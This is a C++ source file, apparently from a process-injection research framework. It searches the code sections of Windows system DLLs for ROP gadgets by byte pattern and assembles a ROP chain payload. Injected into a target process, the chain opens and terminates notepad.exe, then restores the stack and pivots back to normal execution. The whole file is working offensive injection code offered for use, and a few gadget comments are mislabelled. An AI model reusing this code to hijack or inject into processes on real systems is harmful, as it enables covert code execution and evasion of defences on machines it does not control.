#define _CRT_SECURE_NO_WARNINGS

// Standard Include's
#include "Procs_and_Threads.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <psapi.h>
#include <assert.h>

#define check_Gadget(gadget, name) if (gadget == NULL) printf("\n[+] %s gadget returned null\n\n", name);


#include "Rop_Chain.h"
#include "memmem.h"
typedef struct {
	DWORD64 address;
	size_t size;
}TEXT_SECTION_INFO;



TEXT_SECTION_INFO GetTextSection(HMODULE mod)
{
	TEXT_SECTION_INFO section_info = { 0 };
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)mod;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_OPTIONAL_HEADER OptionalHeader;
	PIMAGE_SECTION_HEADER SectionHeader;

	NtHeader = (PIMAGE_NT_HEADERS)((BYTE*)DosHeader + DosHeader->e_lfanew);
	OptionalHeader = (PIMAGE_OPTIONAL_HEADER)&NtHeader->OptionalHeader;
	SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
	DWORD NumberOfSections = NtHeader->FileHeader.NumberOfSections;

	for (int i = 0; i < NumberOfSections; i++)
	{
		DWORD64 SecSize = SectionHeader->SizeOfRawData;
		if (SecSize != 0)
		{
			if (!memcmp(SectionHeader->Name, ".text", 5))
			{
				section_info.address = (DWORD64)((BYTE*)SectionHeader->VirtualAddress + (DWORD64)DosHeader);
				section_info.size = SectionHeader->SizeOfRawData;
				return section_info;
			}
			else
				SectionHeader++;
		}
		else
			SectionHeader++;
	}

	return section_info;
}

BOOL IsPageExecutable(LPCVOID address)
{
	MEMORY_BASIC_INFORMATION mem_info;
	VirtualQuery(address, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
	if (mem_info.Protect >= 0x10 && mem_info.Protect <= 0x50)
		return TRUE;
	else
		return FALSE;
}

DWORD64 GadgetFinder(const void* const needle, const size_t needle_len)
{

	DWORD64 gadget;

	// ntdll
	HMODULE ntdll = GetModuleHandleA("ntdll");
	if (ntdll != NULL)
	{
		MODULEINFO ntdll_modinfo;
		GetModuleInformation(GetCurrentProcess(), ntdll, &ntdll_modinfo, sizeof(ntdll_modinfo));
		TEXT_SECTION_INFO ntdll_Section = GetTextSection(ntdll);
		gadget = (DWORD64)memmem((BYTE*)ntdll_Section.address, ntdll_Section.size, needle, needle_len);
		if (gadget && IsPageExecutable((LPCVOID)gadget))
			return gadget;
	}


	// kernelbase
	HMODULE kernelbase = GetModuleHandleA("kernelbase");
	if (kernelbase != NULL)
	{
		MODULEINFO kerbase_modinfo;
		GetModuleInformation(GetCurrentProcess(), kernelbase, &kerbase_modinfo, sizeof(kerbase_modinfo));
		TEXT_SECTION_INFO kernelbase_Section = GetTextSection(kernelbase);
		gadget = (DWORD64)memmem((BYTE*)kernelbase_Section.address, kernelbase_Section.size, needle, needle_len);
		if (gadget && IsPageExecutable((LPCVOID)gadget))
			return gadget;
	}

	//user32
	HMODULE user32 = GetModuleHandleA("user32");
	if (user32 != NULL)
	{
		MODULEINFO user32_modinfo;
		GetModuleInformation(GetCurrentProcess(), user32, &user32_modinfo, sizeof(user32_modinfo));
		TEXT_SECTION_INFO user32_Section = GetTextSection(user32);
		gadget = (DWORD64)memmem((BYTE*)user32_Section.address, user32_Section.size, needle, needle_len);
		if (gadget && IsPageExecutable((LPCVOID)gadget))
			return gadget;
	}


	//kernel32
	HMODULE kernel32 = GetModuleHandleA("kernel32");
	if (kernel32 != NULL)
	{
		MODULEINFO kernel32_modinfo;
		GetModuleInformation(GetCurrentProcess(), kernel32, &kernel32_modinfo, sizeof(kernel32_modinfo));
		TEXT_SECTION_INFO kernel32_Section = GetTextSection(kernel32);
		gadget = (DWORD64)memmem((BYTE*)kernel32_Section.address, kernel32_Section.size, needle, needle_len);
		if (gadget && IsPageExecutable((LPCVOID)gadget))
			return gadget;
	}


	//gdi32
	HMODULE gdi32 = GetModuleHandleA("gdi32");
	if (gdi32 != NULL)
	{
		MODULEINFO gdi32_modinfo;
		GetModuleInformation(GetCurrentProcess(), gdi32, &gdi32_modinfo, sizeof(gdi32_modinfo));
		TEXT_SECTION_INFO gdi32_Section = GetTextSection(gdi32);
		gadget = (DWORD64)memmem((BYTE*)gdi32_Section.address, gdi32_Section.size, needle, needle_len);
		if (gadget && IsPageExecutable((LPCVOID)gadget))
			return gadget;
	}


	//GdiPlus
	HMODULE gdiPlus = GetModuleHandleA("GdiPlus");
	if (gdiPlus != NULL)
	{
		MODULEINFO gdiPlus_modinfo;
		GetModuleInformation(GetCurrentProcess(), gdiPlus, &gdiPlus_modinfo, sizeof(gdiPlus_modinfo));
		TEXT_SECTION_INFO gdiPlus_Section = GetTextSection(gdiPlus);
		gadget = (DWORD64)memmem((BYTE*)gdiPlus_Section.address, gdiPlus_Section.size, needle, needle_len);
		if (gadget && IsPageExecutable((LPCVOID)gadget))
			return gadget;
	}

	return 0;


}

PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
{
	LoadLibrary(L"gdi32.dll");
	PINJECTRA_PACKET* output;
	DWORD64 rop_pos = 0;
	DWORD64* ROP_chain;

	CHAR location[] = "psapi.dll";
	DWORD locSize = strlen(location);

	WCHAR terminateStr[] = L"notepad.exe";
	DWORD terminatePid = NameToPID((WCHAR*)terminateStr);

	HMODULE ntdll = GetModuleHandleA("ntdll");
	if (ntdll == INVALID_HANDLE_VALUE)
		return NULL;

	output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));

	DWORD64 GADGET_loop = GadgetFinder("\xEB\xFE", 2); // jmp -2
	check_Gadget(GADGET_loop, "GADGET_loop");
	/*
	ntdll!LdrpHandleInvalidUserCallTarget+0x7f:
	00007ff8`5c63b3bf 58              pop     rax
	00007ff8`5c63b3c0 5a              pop     rdx
	00007ff8`5c63b3c1 59              pop     rcx
	00007ff8`5c63b3c2 4158            pop     r8
	00007ff8`5c63b3c4 4159            pop     r9
	00007ff8`5c63b3c6 415a            pop     r10
	00007ff8`5c63b3c8 415b            pop     r11
	00007ff8`5c63b3ca c3              ret
	*/
	DWORD64 GADGET_popregs = GadgetFinder("\x58\x5a\x59\x41\x58\x41\x59\x41\x5a\x41\x5b\xc3", 12);

	DWORD64 GADGET_ret = GadgetFinder("\xC3", 1); // ret;
	check_Gadget(GADGET_ret, "GADGET_ret");

	DWORD64 GADGET_pivot = GadgetFinder("\x5C\xC3", 2); // pop rsp; ret
	check_Gadget(GADGET_pivot, "GADGET_pivot");

	DWORD64 GADGET_addrsp = GadgetFinder("\x48\x83\xC4\x28\xC3", 5); // add rsp, 0x28; ret
	check_Gadget(GADGET_addrsp, "GADGET_addrsp");

	DWORD64 GADGET_popecx = GadgetFinder("\x59\xC3", 2); // pop ecx; ret;
	check_Gadget(GADGET_popecx, "GADGET_popecx");

	DWORD64 GADGET_poprax = GadgetFinder("\x58\xC3", 2); // push eax; ret;
	check_Gadget(GADGET_poprax, "GADGET_poprax");

	DWORD64 GADGET_poprdx = GadgetFinder("\x5A\xC3", 2); // push eax; ret;
	check_Gadget(GADGET_poprdx, "GADGET_poprdx");

	DWORD64 GADGET_poprcx = GadgetFinder("\x59\xC3", 2); // push eax; ret;
	check_Gadget(GADGET_poprcx, "GADGET_poprcx");

	DWORD64 GADGET_popr8 = GadgetFinder("\x41\x58\xC3", 3); // pop r8; ret;
	check_Gadget(GADGET_popr8, "GADGET_popr8");

	DWORD64 GADGET_movr8deax = GadgetFinder("\x44\x8B\xC0\x41\x8B\xC0\x48\x83\xC4\x28\xC3", 11); // mov r8d, eax; mov eax, r8d; add rsp, 0x28; ret;
	check_Gadget(GADGET_movr8deax, "GADGET_movr8deax");

	DWORD64 GADGET_movsxd = GadgetFinder("\x4C\x63\xC8\x49\x8B\xC1\x48\x83\xC4\x28\xC3", 11); // movsxd r9, eax; mov rax, r9; add rsp 0x28; ret
	check_Gadget(GADGET_movsxd, "GADGET_movsxd");

	//DWORD64 GADGET_movecxeax = GadgetFinder("\x8B\xC8\x48\x8B\xC1\x48\x83\xC4\x28\xC3", 10); // mov ecx, eax; mov rax, rcx; add rsp 0x28; ret;

	DWORD64 GADGET_xchgeaxecx = GadgetFinder("\x91\xC3", 2); // xchg eax, ecx; ret;
	check_Gadget(GADGET_xchgeaxecx, "GADGET_xchgeaxecx");

	DWORD64 GADGET_xorraxrax = GadgetFinder("\x48\x33\xC0\xC3", 4); // xor rax, rax; ret;
	check_Gadget(GADGET_xorraxrax, "GADGET_xorraxrax");

	// Return with error if one of gadgets wasn't found
	if (GADGET_loop == 0 || GADGET_ret == 0 || GADGET_pivot == 0 || GADGET_addrsp == 0 || GADGET_popecx == 0 || GADGET_movr8deax == 0\
		|| GADGET_poprax == 0 || GADGET_poprdx == 0 || GADGET_poprcx == 0 || GADGET_popr8 == 0 || GADGET_movsxd == 0 || GADGET_xchgeaxecx == 0 || GADGET_xorraxrax == 0)
	{
		return 0;
	}


	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));

#define DONT_CARE 0
#define	PROCESS_TERMINATE 1
#define FALSE 0

	OSVERSIONINFOEX meow;
	meow.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionOs(&meow);

	if (meow.dwMajorVersion == 10)
	{
		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
			ROP_chain[rop_pos++] = GADGET_ret;

		// Windows10 ---> r8 first type 
		if (GADGET_popr8)
		{
			// Prepare registers for OpenProcess
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			ROP_chain[rop_pos++] = FALSE; // rdx
			ROP_chain[rop_pos++] = GADGET_popr8;
			ROP_chain[rop_pos++] = terminatePid; // r8
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}

		// Windows10 ---> r8 second type 
		else
		{
			// Prepare registers for OpenProcess
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			ROP_chain[rop_pos++] = FALSE; // rdx
			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
			ROP_chain[rop_pos++] = terminatePid; // rax
			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}


		// Call OpenProcess
		ROP_chain[rop_pos++] = (DWORD64)OpenProcess;
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

		//// Get returned handle into ECX
		ROP_chain[rop_pos++] = GADGET_xchgeaxecx;

		// TerminateProcess by handle
		ROP_chain[rop_pos++] = (DWORD64)TerminateProcess;
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

		DWORD64 saved_return_address;

		// Windows10 ---> r8 first type 
		if (GADGET_popr8)
		{
			// Prepare registers to memmove
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			saved_return_address = rop_pos++; // rdx
			ROP_chain[rop_pos++] = GADGET_popr8;
			ROP_chain[rop_pos++] = 8; // r8
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}

		// Windows10 ---> r8 second type 
		else
		{
			// Prepare registers to memmove
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			saved_return_address = rop_pos++; // rdx
			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
			ROP_chain[rop_pos++] = 8; // rax
			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}

		// Call memmove and return to normal execution
		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		ROP_chain[rop_pos++] = GADGET_pivot;
		ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];

		// Write text to stack
		/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
		strcpy((char*)&ROP_chain[rop_pos], location);
		rop_pos += locSize;*/

		// Store new TOS 
		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
		ROP_chain[rop_pos++] = DONT_CARE;

		// Update Runtime Parameters with ROP-specific Parameters
		runtime_parameters["saved_return_address"] = saved_return_address;
		runtime_parameters["GADGET_pivot"] = GADGET_pivot;
		runtime_parameters["rop_pos"] = rop_pos;

		output->buffer = ROP_chain;
		output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
		output->metadata = &runtime_parameters;

		printf("Dynamic.cpp --> rop chain built, returning\n");

		return output;
	}

	else
	{
		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
			ROP_chain[rop_pos++] = GADGET_ret;

		// Windows10 ---> r8 first type 
		if (GADGET_popr8)
		{
			// Prepare registers for OpenProcess
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			ROP_chain[rop_pos++] = FALSE; // rdx
			ROP_chain[rop_pos++] = GADGET_popr8;
			ROP_chain[rop_pos++] = terminatePid; // r8
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}

		// Windows10 ---> r8 second type 
		else
		{
			// Prepare registers for OpenProcess
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			ROP_chain[rop_pos++] = FALSE; // rdx
			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
			ROP_chain[rop_pos++] = terminatePid; // rax
			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}


		// Call OpenProcess
		ROP_chain[rop_pos++] = (DWORD64)OpenProcess;
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

		//// Get returned handle into ECX
		ROP_chain[rop_pos++] = GADGET_xchgeaxecx;

		// TerminateProcess by handle
		ROP_chain[rop_pos++] = (DWORD64)TerminateProcess;
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp

		DWORD64 saved_return_address;

		// Windows10 ---> r8 first type 
		if (GADGET_popr8)
		{
			// Prepare registers to memmove
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			saved_return_address = rop_pos++; // rdx
			ROP_chain[rop_pos++] = GADGET_popr8;
			ROP_chain[rop_pos++] = 8; // r8
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}

		// Windows10 ---> r8 second type 
		else
		{
			// Prepare registers to memmove
			ROP_chain[rop_pos++] = GADGET_poprcx;
			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
			ROP_chain[rop_pos++] = GADGET_poprdx;
			saved_return_address = rop_pos++; // rdx
			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
			ROP_chain[rop_pos++] = 8; // rax
			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
			ROP_chain[rop_pos++] = GADGET_poprax;
			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
			ROP_chain[rop_pos++] = GADGET_movsxd;
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		}

		// Call memmove and return to normal execution
		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
		ROP_chain[rop_pos++] = GADGET_addrsp;
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
		ROP_chain[rop_pos++] = GADGET_pivot;
		ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];

		// Write text to stack
		/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
		strcpy((char*)&ROP_chain[rop_pos], location);
		rop_pos += locSize;*/

		// Store new TOS 
		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
		ROP_chain[rop_pos++] = DONT_CARE;

		// Update Runtime Parameters with ROP-specific Parameters
		runtime_parameters["saved_return_address"] = saved_return_address;
		runtime_parameters["GADGET_pivot"] = GADGET_pivot;
		runtime_parameters["rop_pos"] = rop_pos;

		output->buffer = ROP_chain;
		output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
		output->metadata = &runtime_parameters;

		printf("Dynamic.cpp --> rop chain built, returning\n");

		return output;
	}



}
